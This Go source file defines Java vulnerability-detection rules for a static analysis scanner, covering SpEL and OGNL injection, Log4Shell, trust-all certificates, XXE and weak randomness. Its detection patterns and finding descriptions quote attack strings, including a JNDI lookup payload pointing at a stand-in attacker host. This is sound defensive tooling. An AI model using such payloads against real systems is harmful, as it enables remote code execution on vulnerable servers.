package java

import (
	"regexp"
	"strings"

	"github.com/turenlabs/batou/internal/rules"
)

// ---------------------------------------------------------------------------
// Extension patterns for JAVA-019 through JAVA-030
// ---------------------------------------------------------------------------

// JAVA-019: Spring SpEL expression with user input (broader pattern)
var (
	reSpELValueAnnotVar    = regexp.MustCompile(`@Value\s*\(\s*"#\{[^}]*\+`)
	reSpELEvalContext      = regexp.MustCompile(`StandardEvaluationContext\s*\(\s*\)`)
	reSpELParseReq         = regexp.MustCompile(`\.parseExpression\s*\(\s*(?:request\.|param|input|body|query|header)`)
)

// JAVA-020: JNDI lookup with user-controlled name (Log4Shell-style)
var (
	reLog4jLookup        = regexp.MustCompile(`\$\{jndi:`)
	reLoggerUserInput    = regexp.MustCompile(`(?:logger|log|LOG)\s*\.(?:info|warn|error|debug|trace|fatal)\s*\(\s*(?:request\.|param|input|user|header|cookie)`)
	reLoggerConcat       = regexp.MustCompile(`(?:logger|log|LOG)\s*\.(?:info|warn|error|debug|trace|fatal)\s*\(\s*"[^"]*"\s*\+\s*(?:request\.|param|input|user|header|cookie)`)
)

// JAVA-021: Java unsafe reflection
var (
	reClassForNameVar    = regexp.MustCompile(`Class\.forName\s*\(\s*(?:request\.|param|input|user|className|name|clazz|type)`)
	reClassForNameConcat = regexp.MustCompile(`Class\.forName\s*\(\s*"[^"]*"\s*\+`)
	reNewInstanceReflect = regexp.MustCompile(`\.newInstance\s*\(\s*\)`)
)

// JAVA-022: Java RMI without SSL/authentication
var (
	reRMIExportNoSSL     = regexp.MustCompile(`UnicastRemoteObject\.export(?:Object)?\s*\(\s*\w+\s*,\s*\d+\s*\)`)
	reRMISocketFactory   = regexp.MustCompile(`(?:SslRMIClientSocketFactory|SslRMIServerSocketFactory)`)
	reRMIRegistryCreate  = regexp.MustCompile(`LocateRegistry\.createRegistry\s*\(\s*\d+\s*\)`)
)

// JAVA-023: Struts OGNL injection
var (
	reOGNLGetValue       = regexp.MustCompile(`Ognl\.getValue\s*\(\s*[a-zA-Z_]\w*`)
	reOGNLSetValue       = regexp.MustCompile(`Ognl\.setValue\s*\(\s*[a-zA-Z_]\w*`)
	reOGNLParseExpr      = regexp.MustCompile(`Ognl\.parseExpression\s*\(\s*[a-zA-Z_]\w*`)
	reStrutsAction       = regexp.MustCompile(`(?:ActionSupport|StrutsAction|ActionMapping)`)
)

// JAVA-024: JDBC connection without SSL
var (
	reJDBCURLNoSSL       = regexp.MustCompile(`"jdbc:(?:mysql|postgresql|mariadb)://[^"]*"`)
	reJDBCSSLParam       = regexp.MustCompile(`(?:useSSL=true|sslMode=|ssl=true|sslmode=require|requireSSL=true)`)
)

// JAVA-025: Java trust all certificates (TrustManager override) - broader
var (
	reCheckClientTrustedEmpty = regexp.MustCompile(`checkClientTrusted\s*\([^)]*\)\s*(?:throws[^{]*)?\{?\s*\}`)
	reGetAcceptedIssuersNull  = regexp.MustCompile(`getAcceptedIssuers\s*\(\s*\)\s*\{[^}]*return\s+(?:null|new\s+X509Certificate\s*\[\s*0\s*\])`)
	reTrustAllComment         = regexp.MustCompile(`(?i)(?:trust.?all|accept.?all|disable.?ssl|ignore.?cert|skip.?verif)`)
)

// JAVA-026: Java hostname verifier disabled (broader detection)
var (
	reSetDefaultHV       = regexp.MustCompile(`HttpsURLConnection\.setDefaultHostnameVerifier\s*\(`)
	reHVLambdaTrue       = regexp.MustCompile(`\(\s*\w+\s*,\s*\w+\s*\)\s*->\s*true`)
	reHVAlwaysTrueAnon   = regexp.MustCompile(`new\s+HostnameVerifier\s*\(\s*\)\s*\{[^}]*return\s+true`)
)

// JAVA-027: Spring mass binding without @InitBinder
var (
	reModelAttribute     = regexp.MustCompile(`@ModelAttribute\s`)
	reInitBinder         = regexp.MustCompile(`@InitBinder`)
	reWebDataBinder      = regexp.MustCompile(`WebDataBinder`)
	reRequestMapping     = regexp.MustCompile(`@(?:RequestMapping|GetMapping|PostMapping|PutMapping|PatchMapping|DeleteMapping)`)
)

// JAVA-028: Java File.createTempFile with predictable name
var (
	reTempFilePredictable = regexp.MustCompile(`File\.createTempFile\s*\(\s*"[^"]+"\s*,\s*"[^"]+"\s*\)`)
	reTempFileSecure      = regexp.MustCompile(`(?:Files\.createTempFile|Files\.createTempDirectory|java\.nio\.file)`)
)

// JAVA-029: Java SecureRandom seed from non-random source
var (
	reSecureRandomSeed     = regexp.MustCompile(`SecureRandom\s*\(\s*\)`)
	reSetSeedManual        = regexp.MustCompile(`\.setSeed\s*\(\s*(?:System\.currentTimeMillis|System\.nanoTime|\d+L?\s*\)|"[^"]*"\.getBytes)`)
	reSecureRandomGetInst  = regexp.MustCompile(`SecureRandom\.getInstance\s*\(`)
)

// JAVA-030: Java XXE via TransformerFactory
var (
	reTransformerFactory   = regexp.MustCompile(`TransformerFactory\.newInstance\s*\(\s*\)`)
	reSAXTransform         = regexp.MustCompile(`SAXTransformerFactory\.newInstance\s*\(\s*\)`)
	reSetFeatureXXE        = regexp.MustCompile(`\.setFeature\s*\(\s*(?:XMLConstants\.FEATURE_SECURE_PROCESSING|"http://javax\.xml\.XMLConstants)`)
	reSetAttrAccessExt     = regexp.MustCompile(`\.setAttribute\s*\(\s*XMLConstants\.ACCESS_EXTERNAL`)
)

func init() {
	rules.Register(&SpringSpELUserInput{})
	rules.Register(&JNDILog4Shell{})
	rules.Register(&JavaUnsafeReflection{})
	rules.Register(&RMIWithoutSSL{})
	rules.Register(&StrutsOGNLInjection{})
	rules.Register(&JDBCWithoutSSL{})
	rules.Register(&JavaTrustAllCerts{})
	rules.Register(&JavaHVDisabled{})
	rules.Register(&SpringMassBinding{})
	rules.Register(&JavaTempFilePredictable{})
	rules.Register(&JavaSecureRandomSeed{})
	rules.Register(&JavaXXETransformer{})
}

// ---------------------------------------------------------------------------
// JAVA-019: Spring SpEL expression with user input
// ---------------------------------------------------------------------------

type SpringSpELUserInput struct{}

func (r *SpringSpELUserInput) ID() string                      { return "BATOU-JAVA-019" }
func (r *SpringSpELUserInput) Name() string                    { return "SpringSpELUserInput" }
func (r *SpringSpELUserInput) DefaultSeverity() rules.Severity { return rules.Critical }
func (r *SpringSpELUserInput) Description() string {
	return "Detects Spring SpEL parseExpression with user-controlled input or StandardEvaluationContext allowing full RCE."
}
func (r *SpringSpELUserInput) Languages() []rules.Language { return []rules.Language{rules.LangJava} }

func (r *SpringSpELUserInput) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	if !strings.Contains(ctx.Content, "SpEL") && !strings.Contains(ctx.Content, "parseExpression") && !strings.Contains(ctx.Content, "EvaluationContext") {
		return nil
	}
	lines := strings.Split(ctx.Content, "\n")
	for i, line := range lines {
		if isComment(line) {
			continue
		}
		var matched string
		var detail string
		if m := reSpELParseReq.FindString(line); m != "" {
			matched = m
			detail = "SpEL parseExpression with user-controlled input"
		} else if reSpELEvalContext.MatchString(line) {
			if hasNearbyPattern(lines, i, reSpELRequestParam) {
				matched = strings.TrimSpace(line)
				detail = "StandardEvaluationContext used with user input (full type access)"
			}
		}
		if matched != "" {
			findings = append(findings, rules.Finding{
				RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
				Title:         "Spring SpEL injection: " + detail,
				Description:   "User-controlled input evaluated as SpEL expressions with StandardEvaluationContext allows invoking any Java method including Runtime.exec(). This leads to immediate remote code execution.",
				FilePath:      ctx.FilePath,
				LineNumber:    i + 1,
				MatchedText:   truncate(matched, 120),
				Suggestion:    "Use SimpleEvaluationContext instead of StandardEvaluationContext to restrict type access. Never pass user input to parseExpression().",
				CWEID:         "CWE-917",
				OWASPCategory: "A03:2021-Injection",
				Language:      ctx.Language,
				Confidence:    "high",
				Tags:          []string{"java", "spring", "spel", "rce"},
			})
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// JAVA-020: JNDI lookup with user-controlled name (Log4Shell)
// ---------------------------------------------------------------------------

type JNDILog4Shell struct{}

func (r *JNDILog4Shell) ID() string                      { return "BATOU-JAVA-020" }
func (r *JNDILog4Shell) Name() string                    { return "JNDILog4Shell" }
func (r *JNDILog4Shell) DefaultSeverity() rules.Severity { return rules.Critical }
func (r *JNDILog4Shell) Description() string {
	return "Detects logging user-controlled input that may contain JNDI lookup strings (Log4Shell-style attack)."
}
func (r *JNDILog4Shell) Languages() []rules.Language { return []rules.Language{rules.LangJava} }

func (r *JNDILog4Shell) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	if !strings.Contains(ctx.Content, "log") && !strings.Contains(ctx.Content, "LOG") && !strings.Contains(ctx.Content, "logger") {
		return nil
	}
	lines := strings.Split(ctx.Content, "\n")
	for i, line := range lines {
		if isComment(line) {
			continue
		}
		var matched string
		var detail string
		if m := reLoggerConcat.FindString(line); m != "" {
			matched = m
			detail = "Logger concatenating user input (Log4Shell vector)"
		} else if m := reLoggerUserInput.FindString(line); m != "" {
			matched = m
			detail = "Logger called with user-controlled variable"
		}
		if matched != "" {
			findings = append(findings, rules.Finding{
				RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
				Title:         "JNDI/Log4Shell risk: " + detail,
				Description:   "Logging user-controlled input with Log4j can trigger JNDI lookups via ${jndi:ldap://attacker.com/exploit} patterns. This enables remote code execution via CVE-2021-44228 (Log4Shell) if an unpatched Log4j version is used.",
				FilePath:      ctx.FilePath,
				LineNumber:    i + 1,
				MatchedText:   truncate(matched, 120),
				Suggestion:    "Update Log4j to 2.17.1+. Use parameterized logging: logger.info(\"User: {}\", userInput) instead of concatenation. Set log4j2.formatMsgNoLookups=true. Remove JndiLookup class from classpath.",
				CWEID:         "CWE-917",
				OWASPCategory: "A06:2021-Vulnerable and Outdated Components",
				Language:      ctx.Language,
				Confidence:    "high",
				Tags:          []string{"java", "log4shell", "jndi", "rce"},
			})
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// JAVA-021: Java unsafe reflection (Class.forName with user input)
// ---------------------------------------------------------------------------

type JavaUnsafeReflection struct{}

func (r *JavaUnsafeReflection) ID() string                      { return "BATOU-JAVA-021" }
func (r *JavaUnsafeReflection) Name() string                    { return "JavaUnsafeReflection" }
func (r *JavaUnsafeReflection) DefaultSeverity() rules.Severity { return rules.High }
func (r *JavaUnsafeReflection) Description() string {
	return "Detects Class.forName() with user-controlled class name enabling arbitrary class instantiation."
}
func (r *JavaUnsafeReflection) Languages() []rules.Language { return []rules.Language{rules.LangJava} }

func (r *JavaUnsafeReflection) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	if !strings.Contains(ctx.Content, "Class.forName") {
		return nil
	}
	lines := strings.Split(ctx.Content, "\n")
	for i, line := range lines {
		if isComment(line) {
			continue
		}
		var matched string
		if m := reClassForNameVar.FindString(line); m != "" {
			matched = m
		} else if m := reClassForNameConcat.FindString(line); m != "" {
			matched = m
		}
		if matched != "" {
			findings = append(findings, rules.Finding{
				RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
				Title:         "Unsafe reflection: Class.forName with user-controlled class name",
				Description:   "Class.forName() with user-controlled input allows loading and instantiating arbitrary classes. Combined with newInstance(), this can execute arbitrary constructors, access internal APIs, or trigger gadget chains.",
				FilePath:      ctx.FilePath,
				LineNumber:    i + 1,
				MatchedText:   truncate(matched, 120),
				Suggestion:    "Use an allowlist of permitted class names. Never pass user input directly to Class.forName(). Consider using a registry pattern: Map<String, Supplier> registry.",
				CWEID:         "CWE-470",
				OWASPCategory: "A03:2021-Injection",
				Language:      ctx.Language,
				Confidence:    "high",
				Tags:          []string{"java", "reflection", "class-loading"},
			})
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// JAVA-022: Java RMI without SSL/authentication
// ---------------------------------------------------------------------------

type RMIWithoutSSL struct{}

func (r *RMIWithoutSSL) ID() string                      { return "BATOU-JAVA-022" }
func (r *RMIWithoutSSL) Name() string                    { return "RMIWithoutSSL" }
func (r *RMIWithoutSSL) DefaultSeverity() rules.Severity { return rules.High }
func (r *RMIWithoutSSL) Description() string {
	return "Detects Java RMI objects exported or registries created without SSL socket factories."
}
func (r *RMIWithoutSSL) Languages() []rules.Language { return []rules.Language{rules.LangJava} }

func (r *RMIWithoutSSL) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	if !strings.Contains(ctx.Content, "RMI") && !strings.Contains(ctx.Content, "UnicastRemoteObject") && !strings.Contains(ctx.Content, "LocateRegistry") {
		return nil
	}
	if reRMISocketFactory.MatchString(ctx.Content) {
		return nil
	}
	lines := strings.Split(ctx.Content, "\n")
	for i, line := range lines {
		if isComment(line) {
			continue
		}
		var matched string
		var detail string
		if m := reRMIExportNoSSL.FindString(line); m != "" {
			matched = m
			detail = "RMI object exported without SSL socket factory"
		} else if m := reRMIRegistryCreate.FindString(line); m != "" {
			matched = m
			detail = "RMI Registry created without SSL (plaintext)"
		}
		if matched != "" {
			findings = append(findings, rules.Finding{
				RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
				Title:         "Java RMI without SSL: " + detail,
				Description:   "RMI objects exported or registries created without SSL transmit serialized objects in plaintext. This enables man-in-the-middle attacks and exposes the deserialization surface to network attackers.",
				FilePath:      ctx.FilePath,
				LineNumber:    i + 1,
				MatchedText:   truncate(matched, 120),
				Suggestion:    "Use SslRMIClientSocketFactory and SslRMIServerSocketFactory: UnicastRemoteObject.exportObject(obj, port, new SslRMIClientSocketFactory(), new SslRMIServerSocketFactory()).",
				CWEID:         "CWE-319",
				OWASPCategory: "A02:2021-Cryptographic Failures",
				Language:      ctx.Language,
				Confidence:    "high",
				Tags:          []string{"java", "rmi", "ssl", "plaintext"},
			})
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// JAVA-023: Struts OGNL injection
// ---------------------------------------------------------------------------

type StrutsOGNLInjection struct{}

func (r *StrutsOGNLInjection) ID() string                      { return "BATOU-JAVA-023" }
func (r *StrutsOGNLInjection) Name() string                    { return "StrutsOGNLInjection" }
func (r *StrutsOGNLInjection) DefaultSeverity() rules.Severity { return rules.Critical }
func (r *StrutsOGNLInjection) Description() string {
	return "Detects OGNL expression evaluation with user-controlled input in Struts applications."
}
func (r *StrutsOGNLInjection) Languages() []rules.Language { return []rules.Language{rules.LangJava} }

func (r *StrutsOGNLInjection) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	if !strings.Contains(ctx.Content, "Ognl") && !strings.Contains(ctx.Content, "ognl") {
		return nil
	}
	lines := strings.Split(ctx.Content, "\n")
	for i, line := range lines {
		if isComment(line) {
			continue
		}
		var matched string
		if m := reOGNLGetValue.FindString(line); m != "" {
			matched = m
		} else if m := reOGNLSetValue.FindString(line); m != "" {
			matched = m
		} else if m := reOGNLParseExpr.FindString(line); m != "" {
			matched = m
		}
		if matched != "" {
			findings = append(findings, rules.Finding{
				RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
				Title:         "OGNL injection with user-controlled expression",
				Description:   "OGNL expression evaluation with user input allows arbitrary Java code execution via @java.lang.Runtime@getRuntime().exec(). This is the attack vector used in Struts2 CVE-2017-5638 (Equifax breach).",
				FilePath:      ctx.FilePath,
				LineNumber:    i + 1,
				MatchedText:   truncate(matched, 120),
				Suggestion:    "Never pass user input to Ognl.getValue/setValue/parseExpression. Use Struts2 2.5.22+ with strict method invocation. Consider migrating to Spring MVC.",
				CWEID:         "CWE-917",
				OWASPCategory: "A03:2021-Injection",
				Language:      ctx.Language,
				Confidence:    "high",
				Tags:          []string{"java", "struts", "ognl", "rce"},
			})
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// JAVA-024: JDBC connection without SSL
// ---------------------------------------------------------------------------

type JDBCWithoutSSL struct{}

func (r *JDBCWithoutSSL) ID() string                      { return "BATOU-JAVA-024" }
func (r *JDBCWithoutSSL) Name() string                    { return "JDBCWithoutSSL" }
func (r *JDBCWithoutSSL) DefaultSeverity() rules.Severity { return rules.Medium }
func (r *JDBCWithoutSSL) Description() string {
	return "Detects JDBC connection URLs for MySQL/PostgreSQL without SSL parameters."
}
func (r *JDBCWithoutSSL) Languages() []rules.Language { return []rules.Language{rules.LangJava} }

func (r *JDBCWithoutSSL) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	lines := strings.Split(ctx.Content, "\n")
	for i, line := range lines {
		if isComment(line) {
			continue
		}
		if m := reJDBCURLNoSSL.FindString(line); m != "" {
			if !reJDBCSSLParam.MatchString(m) {
				findings = append(findings, rules.Finding{
					RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
					Title:         "JDBC connection without SSL encryption",
					Description:   "JDBC connection URL for MySQL/PostgreSQL does not include SSL parameters. Database traffic including queries, results, and credentials is transmitted in plaintext, vulnerable to network eavesdropping.",
					FilePath:      ctx.FilePath,
					LineNumber:    i + 1,
					MatchedText:   truncate(m, 120),
					Suggestion:    "Add SSL parameters: MySQL: ?useSSL=true&requireSSL=true, PostgreSQL: ?sslmode=require. Configure the database server to require SSL connections.",
					CWEID:         "CWE-319",
					OWASPCategory: "A02:2021-Cryptographic Failures",
					Language:      ctx.Language,
					Confidence:    "medium",
					Tags:          []string{"java", "jdbc", "ssl", "plaintext"},
				})
			}
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// JAVA-025: Java trust all certificates (TrustManager override)
// ---------------------------------------------------------------------------

type JavaTrustAllCerts struct{}

func (r *JavaTrustAllCerts) ID() string                      { return "BATOU-JAVA-025" }
func (r *JavaTrustAllCerts) Name() string                    { return "JavaTrustAllCerts" }
func (r *JavaTrustAllCerts) DefaultSeverity() rules.Severity { return rules.Critical }
func (r *JavaTrustAllCerts) Description() string {
	return "Detects empty checkClientTrusted/getAcceptedIssuers or trust-all comments indicating certificate validation bypass."
}
func (r *JavaTrustAllCerts) Languages() []rules.Language { return []rules.Language{rules.LangJava} }

func (r *JavaTrustAllCerts) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	if !strings.Contains(ctx.Content, "TrustManager") && !strings.Contains(ctx.Content, "checkClientTrusted") && !strings.Contains(ctx.Content, "getAcceptedIssuers") {
		return nil
	}
	lines := strings.Split(ctx.Content, "\n")
	for i, line := range lines {
		if isComment(line) {
			continue
		}
		var matched string
		var detail string
		if reCheckClientTrustedEmpty.MatchString(line) {
			matched = strings.TrimSpace(line)
			detail = "Empty checkClientTrusted (accepts all client certificates)"
		} else if reGetAcceptedIssuersNull.MatchString(line) {
			matched = strings.TrimSpace(line)
			detail = "getAcceptedIssuers returns null/empty (no trusted CAs)"
		} else if reTrustAllComment.MatchString(line) && strings.Contains(ctx.Content, "TrustManager") {
			if strings.Contains(line, "class") || strings.Contains(line, "new") {
				matched = strings.TrimSpace(line)
				detail = "Trust-all TrustManager implementation"
			}
		}
		if matched != "" {
			findings = append(findings, rules.Finding{
				RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
				Title:         "Trust all certificates: " + detail,
				Description:   "This TrustManager implementation bypasses certificate validation, accepting any certificate including self-signed, expired, or revoked ones. All HTTPS connections using this TrustManager are vulnerable to man-in-the-middle attacks.",
				FilePath:      ctx.FilePath,
				LineNumber:    i + 1,
				MatchedText:   truncate(matched, 120),
				Suggestion:    "Remove the custom TrustManager and use the default TrustManagerFactory with the system trust store. For self-signed certs in development, add them to a local keystore.",
				CWEID:         "CWE-295",
				OWASPCategory: "A07:2021-Identification and Authentication Failures",
				Language:      ctx.Language,
				Confidence:    "high",
				Tags:          []string{"java", "tls", "certificate", "trust-all"},
			})
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// JAVA-026: Java hostname verifier disabled
// ---------------------------------------------------------------------------

type JavaHVDisabled struct{}

func (r *JavaHVDisabled) ID() string                      { return "BATOU-JAVA-026" }
func (r *JavaHVDisabled) Name() string                    { return "JavaHVDisabled" }
func (r *JavaHVDisabled) DefaultSeverity() rules.Severity { return rules.Critical }
func (r *JavaHVDisabled) Description() string {
	return "Detects HttpsURLConnection.setDefaultHostnameVerifier with lambda/anonymous class that always returns true."
}
func (r *JavaHVDisabled) Languages() []rules.Language { return []rules.Language{rules.LangJava} }

func (r *JavaHVDisabled) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	if !strings.Contains(ctx.Content, "HostnameVerifier") && !strings.Contains(ctx.Content, "setDefaultHostnameVerifier") {
		return nil
	}
	lines := strings.Split(ctx.Content, "\n")
	for i, line := range lines {
		if isComment(line) {
			continue
		}
		var matched string
		var detail string
		if reSetDefaultHV.MatchString(line) && reHVLambdaTrue.MatchString(line) {
			matched = strings.TrimSpace(line)
			detail = "setDefaultHostnameVerifier with lambda always returning true"
		} else if reSetDefaultHV.MatchString(line) {
			ctx2 := surroundingContext(lines, i, 10)
			if reHVAlwaysTrueAnon.MatchString(ctx2) {
				matched = strings.TrimSpace(line)
				detail = "setDefaultHostnameVerifier with anonymous class returning true"
			}
		}
		if matched != "" {
			findings = append(findings, rules.Finding{
				RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
				Title:         "Hostname verifier disabled: " + detail,
				Description:   "Setting the default hostname verifier to always return true disables hostname checking for ALL HTTPS connections in the JVM. Any certificate for any hostname will be accepted, enabling man-in-the-middle attacks.",
				FilePath:      ctx.FilePath,
				LineNumber:    i + 1,
				MatchedText:   truncate(matched, 120),
				Suggestion:    "Do not override the default HostnameVerifier. If custom verification is needed, use HttpsURLConnection.getDefaultHostnameVerifier() as a base and add specific checks.",
				CWEID:         "CWE-295",
				OWASPCategory: "A07:2021-Identification and Authentication Failures",
				Language:      ctx.Language,
				Confidence:    "high",
				Tags:          []string{"java", "hostname-verifier", "tls", "mitm"},
			})
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// JAVA-027: Spring mass binding without @InitBinder
// ---------------------------------------------------------------------------

type SpringMassBinding struct{}

func (r *SpringMassBinding) ID() string                      { return "BATOU-JAVA-027" }
func (r *SpringMassBinding) Name() string                    { return "SpringMassBinding" }
func (r *SpringMassBinding) DefaultSeverity() rules.Severity { return rules.Medium }
func (r *SpringMassBinding) Description() string {
	return "Detects Spring @ModelAttribute binding without @InitBinder to restrict allowed fields (mass assignment)."
}
func (r *SpringMassBinding) Languages() []rules.Language { return []rules.Language{rules.LangJava} }

func (r *SpringMassBinding) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	if !reModelAttribute.MatchString(ctx.Content) {
		return nil
	}
	if reInitBinder.MatchString(ctx.Content) || reWebDataBinder.MatchString(ctx.Content) {
		return nil
	}
	if !reRequestMapping.MatchString(ctx.Content) {
		return nil
	}
	lines := strings.Split(ctx.Content, "\n")
	for i, line := range lines {
		if isComment(line) {
			continue
		}
		if reModelAttribute.MatchString(line) {
			findings = append(findings, rules.Finding{
				RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
				Title:         "Spring mass assignment: @ModelAttribute without @InitBinder",
				Description:   "Using @ModelAttribute without @InitBinder to restrict allowed fields lets attackers set any field on the model object via request parameters, including admin flags, IDs, or internal state.",
				FilePath:      ctx.FilePath,
				LineNumber:    i + 1,
				MatchedText:   truncate(strings.TrimSpace(line), 120),
				Suggestion:    "Add @InitBinder to restrict allowed fields: binder.setAllowedFields(\"name\", \"email\"). Or use a DTO with only the fields you want to bind.",
				CWEID:         "CWE-915",
				OWASPCategory: "A04:2021-Insecure Design",
				Language:      ctx.Language,
				Confidence:    "medium",
				Tags:          []string{"java", "spring", "mass-assignment", "model-attribute"},
			})
			break // one per file
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// JAVA-028: Java File.createTempFile with predictable name
// ---------------------------------------------------------------------------

type JavaTempFilePredictable struct{}

func (r *JavaTempFilePredictable) ID() string                      { return "BATOU-JAVA-028" }
func (r *JavaTempFilePredictable) Name() string                    { return "JavaTempFilePredictable" }
func (r *JavaTempFilePredictable) DefaultSeverity() rules.Severity { return rules.Medium }
func (r *JavaTempFilePredictable) Description() string {
	return "Detects File.createTempFile with only two arguments (uses default temp directory with predictable path)."
}
func (r *JavaTempFilePredictable) Languages() []rules.Language { return []rules.Language{rules.LangJava} }

func (r *JavaTempFilePredictable) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	if !strings.Contains(ctx.Content, "createTempFile") {
		return nil
	}
	if reTempFileSecure.MatchString(ctx.Content) {
		return nil
	}
	lines := strings.Split(ctx.Content, "\n")
	for i, line := range lines {
		if isComment(line) {
			continue
		}
		if m := reTempFilePredictable.FindString(line); m != "" {
			findings = append(findings, rules.Finding{
				RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
				Title:         "Predictable temp file: File.createTempFile in shared temp directory",
				Description:   "File.createTempFile() with two arguments creates files in the shared system temp directory (/tmp). The file is created with default permissions (world-readable on many systems), and the predictable naming pattern enables symlink attacks.",
				FilePath:      ctx.FilePath,
				LineNumber:    i + 1,
				MatchedText:   truncate(m, 120),
				Suggestion:    "Use java.nio.file.Files.createTempFile() which creates files with secure permissions (owner-only). Specify a private temp directory: Files.createTempFile(privateDir, prefix, suffix).",
				CWEID:         "CWE-377",
				OWASPCategory: "A01:2021-Broken Access Control",
				Language:      ctx.Language,
				Confidence:    "medium",
				Tags:          []string{"java", "temp-file", "predictable", "symlink"},
			})
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// JAVA-029: Java SecureRandom seed from non-random source
// ---------------------------------------------------------------------------

type JavaSecureRandomSeed struct{}

func (r *JavaSecureRandomSeed) ID() string                      { return "BATOU-JAVA-029" }
func (r *JavaSecureRandomSeed) Name() string                    { return "JavaSecureRandomSeed" }
func (r *JavaSecureRandomSeed) DefaultSeverity() rules.Severity { return rules.High }
func (r *JavaSecureRandomSeed) Description() string {
	return "Detects SecureRandom.setSeed() with predictable values like System.currentTimeMillis, reducing entropy."
}
func (r *JavaSecureRandomSeed) Languages() []rules.Language { return []rules.Language{rules.LangJava} }

func (r *JavaSecureRandomSeed) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	if !strings.Contains(ctx.Content, "SecureRandom") {
		return nil
	}
	lines := strings.Split(ctx.Content, "\n")
	for i, line := range lines {
		if isComment(line) {
			continue
		}
		if m := reSetSeedManual.FindString(line); m != "" {
			findings = append(findings, rules.Finding{
				RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
				Title:         "SecureRandom seeded with predictable value",
				Description:   "Calling setSeed() with System.currentTimeMillis(), nanoTime(), or a constant replaces the OS-provided entropy with a predictable value. An attacker who knows the approximate time of seeding can reproduce the random sequence.",
				FilePath:      ctx.FilePath,
				LineNumber:    i + 1,
				MatchedText:   truncate(m, 120),
				Suggestion:    "Do not call setSeed() manually. Let SecureRandom self-seed from the OS entropy source (/dev/urandom). Use: SecureRandom random = new SecureRandom(); // self-seeds on first use.",
				CWEID:         "CWE-330",
				OWASPCategory: "A02:2021-Cryptographic Failures",
				Language:      ctx.Language,
				Confidence:    "high",
				Tags:          []string{"java", "securerandom", "seed", "entropy"},
			})
		}
	}
	return findings
}

// ---------------------------------------------------------------------------
// JAVA-030: Java XXE via TransformerFactory
// ---------------------------------------------------------------------------

type JavaXXETransformer struct{}

func (r *JavaXXETransformer) ID() string                      { return "BATOU-JAVA-030" }
func (r *JavaXXETransformer) Name() string                    { return "JavaXXETransformer" }
func (r *JavaXXETransformer) DefaultSeverity() rules.Severity { return rules.High }
func (r *JavaXXETransformer) Description() string {
	return "Detects TransformerFactory.newInstance() without secure processing or external entity restrictions."
}
func (r *JavaXXETransformer) Languages() []rules.Language { return []rules.Language{rules.LangJava} }

func (r *JavaXXETransformer) Scan(ctx *rules.ScanContext) []rules.Finding {
	var findings []rules.Finding
	if !strings.Contains(ctx.Content, "TransformerFactory") {
		return nil
	}
	if reSetFeatureXXE.MatchString(ctx.Content) && reSetAttrAccessExt.MatchString(ctx.Content) {
		return nil
	}
	lines := strings.Split(ctx.Content, "\n")
	for i, line := range lines {
		if isComment(line) {
			continue
		}
		var matched string
		if m := reTransformerFactory.FindString(line); m != "" {
			matched = m
		} else if m := reSAXTransform.FindString(line); m != "" {
			matched = m
		}
		if matched != "" {
			findings = append(findings, rules.Finding{
				RuleID: r.ID(), Severity: r.DefaultSeverity(), SeverityLabel: r.DefaultSeverity().String(),
				Title:         "XXE: TransformerFactory without secure processing",
				Description:   "TransformerFactory.newInstance() without FEATURE_SECURE_PROCESSING and ACCESS_EXTERNAL_* restrictions allows XML External Entity (XXE) attacks when transforming untrusted XML. Attackers can read local files or trigger SSRF.",
				FilePath:      ctx.FilePath,
				LineNumber:    i + 1,
				MatchedText:   truncate(matched, 120),
				Suggestion:    "Set secure features: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true); factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\");",
				CWEID:         "CWE-611",
				OWASPCategory: "A05:2021-Security Misconfiguration",
				Language:      ctx.Language,
				Confidence:    "high",
				Tags:          []string{"java", "xxe", "transformer", "xml"},
			})
		}
	}
	return findings
}
